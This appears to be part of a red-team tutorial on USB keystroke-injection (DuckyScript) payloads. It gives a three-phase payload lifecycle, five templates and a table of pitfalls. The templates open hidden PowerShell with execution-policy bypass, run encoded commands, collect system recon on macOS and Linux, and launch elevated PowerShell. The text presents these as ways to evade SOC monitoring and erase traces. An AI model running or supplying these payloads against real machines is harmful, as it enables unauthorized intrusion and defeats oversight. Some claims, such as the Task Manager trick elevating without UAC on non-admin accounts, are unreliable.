Section 1

▶ Payload Structure: Setup, Execution, Cleanup

Every professional payload follows a three-phase structure. Ad hoc scripts that skip phases leave evidence, fail on non-standard configurations, or crash mid-execution. Understanding this model is the difference between a reliable payload and one that works on your test box but fails in production.

PAYLOAD LIFECYCLE ───────────────────────────────────────────────────── PHASE 1: SETUP ┌─────────────────────────────────────────────────┐ │ • Initial DELAY (device enumeration: 2000–5000ms)│ │ • DEFAULTDELAY set for target environment │ │ • Verify focus is on correct window/field │ │ • Handle any pending system notifications │ └─────────────────────────────────────────────────┘ │ ▼ PHASE 2: EXECUTION ┌─────────────────────────────────────────────────┐ │ • Launch interpreter (PowerShell/bash/cmd) │ │ • Execute primary objective commands │ │ • Handle UAC if required │ │ • Confirm successful execution │ └─────────────────────────────────────────────────┘ │ ▼ PHASE 3: CLEANUP ┌─────────────────────────────────────────────────┐ │ • Close opened windows │ │ • Clear command history if applicable │ │ • Return system to original state │ │ • Optional: leave no Notepad/Terminal open │ └─────────────────────────────────────────────────┘
Section 2

▶ Opening Programs: Run Dialog and Shortcuts

Getting a command interpreter open is the first execution step on most Windows payloads. The Run dialog (Win+R) is the most reliable entry point across Windows 7 through Windows 11, as it does not depend on the taskbar being accessible or any application being in focus.

Section 4

▶ Five Payload Templates

Template 1 — Hidden PowerShell Window Windows 10 / 11
DuckyScript 
REM Template 1: Open hidden PowerShell and run inline command
DEFAULTDELAY 100
DELAY 3000

GUI r
DELAY 700
STRING powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "YOUR_COMMAND_HERE"
ENTER
The -WindowStyle Hidden flag prevents a visible PowerShell window from appearing. -ExecutionPolicy Bypass overrides any local policy blocking unsigned scripts. This is the foundation for nearly every Windows red team payload.
Template 2 — Encoded PowerShell Command Windows 10 / 11
DuckyScript + PowerShell Encoding 
REM Template 2: Base64-encoded command avoids special character issues
REM Encode your command first:
REM PS> [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
REM Result: dwBoAG8AYQBtAGkA

DEFAULTDELAY 100
DELAY 3000

GUI r
DELAY 700
STRING powershell -NoP -W Hidden -Exec Bypass -Enc dwBoAG8AYQBtAGkA
ENTER
Base64-encoded commands solve the problem of special characters (&, |, ", ') being mangled by the Run dialog or keyboard layout differences. Always encode complex commands.
Template 3 — macOS Terminal Execution macOS 12 Monterey / 13 Ventura / 14 Sonoma
DuckyScript 
REM Template 3: macOS Spotlight → Terminal → command execution
DEFAULTDELAY 150
DELAY 3000

REM Open Spotlight search
COMMAND SPACE
DELAY 800

REM Type Terminal and open it
STRING Terminal
DELAY 600
ENTER
DELAY 1500

REM Execute command in Terminal
STRING system_profiler SPSoftwareDataType | grep 'System Version' > /tmp/sysinfo.txt
ENTER
DELAY 1000

REM Close Terminal window
COMMAND w
Template 4 — Linux Terminal via Keyboard Shortcut Ubuntu 22.04 LTS / Kali Linux 2024.x
DuckyScript 
REM Template 4: Ubuntu/Kali terminal shortcut
DEFAULTDELAY 120
DELAY 3000

REM Open GNOME terminal (Ctrl+Alt+T — default shortcut)
CTRL ALT t
DELAY 1500

REM Gather system information
STRING uname -a && id && ip a > /tmp/recon.txt 2>&1
ENTER
DELAY 1000

REM Close terminal
STRING exit
ENTER
Template 5 — UAC Bypass via Task Manager Windows 10 / 11 — Elevated Execution
DuckyScript 
REM Template 5: Elevated PowerShell via Task Manager "Run new task"
REM Works without triggering standard UAC prompt flow
DEFAULTDELAY 120
DELAY 3000

REM Open Task Manager
CTRL SHIFT ESCAPE
DELAY 1200

REM Click File menu (Alt+F)
ALT f
DELAY 400

REM Click "Run new task"
STRING r
DELAY 600

REM Check "Create this task with admin privileges" checkbox
TAB REM move to checkbox
SPACE

REM Type command and execute
TAB
STRING powershell -NoP -Exec Bypass -W Hidden
ENTER
DELAY 1500
This technique opens an elevated task without the standard UAC elevation dialog that might alert a monitoring SOC. It works on non-admin local accounts on domain-joined machines where UAC prompts differ from stand-alone workstations.
Section 5

▶ Common Pitfalls and How to Avoid Them

PitfallSymptomFix
Non-US keyboard layoutSpecial characters typed incorrectly (e.g., \ becomes #)Use Base64-encoded commands; avoid symbols in STRING; use environment variables like $env:TEMP
Initial delay too shortFirst keystrokes go to wrong application or are dropped entirelyUse DELAY 5000 for first payload run; reduce only after confirming reliability
UAC prompt interrupts payloadPayload pauses; waiting for elevation clickUse hidden PowerShell (-WindowStyle Hidden) to avoid UAC triggers; or account for UAC with explicit DELAY + navigate-and-confirm
Window focus lostKeystrokes go to background windowAdd DELAY after window-opening commands; use absolute paths in Run dialog to avoid Aero Snap
AutoCorrect or AutoCompleteWords get substituted or expanded unexpectedlyDisable autocorrect before testing; use PowerShell's -Command "..." syntax to bypass shell autocomplete
Screen saver activatesPayload runs but screen is locked mid-executionSend periodic keystrokes (SHIFT alone) during long DELAY periods to prevent screen lock
Testing Workflow

Always test new payloads in a VM snapshot first. Take a snapshot before each test run so you can revert cleanly. Use a Windows 11 evaluation VM from Microsoft's developer downloads — it includes a 90-day license suitable for lab use.
